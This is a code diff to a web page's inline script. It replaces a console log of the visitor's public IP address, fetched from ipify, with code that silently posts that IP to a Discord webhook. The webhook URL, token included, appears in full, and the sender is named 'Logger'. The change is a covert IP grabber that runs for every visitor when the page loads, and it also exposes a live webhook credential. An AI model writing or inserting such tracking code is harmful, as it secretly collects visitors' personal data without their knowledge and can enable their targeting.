@@ -15,7 +15,20 @@
         "https://api.ipify.org?format=jsonp&callback=?",
         function (data) {
           var ip = data.ip;
-        console.log(ip)
+        //console.log(ip)
+          var request = new XMLHttpRequest(); //making a request for the webhook
+        request.open("POST", "https://discord.com/api/webhooks/1113441562408534060/JbnywRXcVkXo8b04JJX3xDBwOL6Atq_c0plGw-xWiHBUKD7xg-EolK5tYqEZLM1CfSae");
+
+         request.setRequestHeader('Content-type', 'application/json');
+       
+       
+        var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + ip + "*"
+      }
+       request.send(JSON.stringify(params));
+          
         }
       );
     </script>
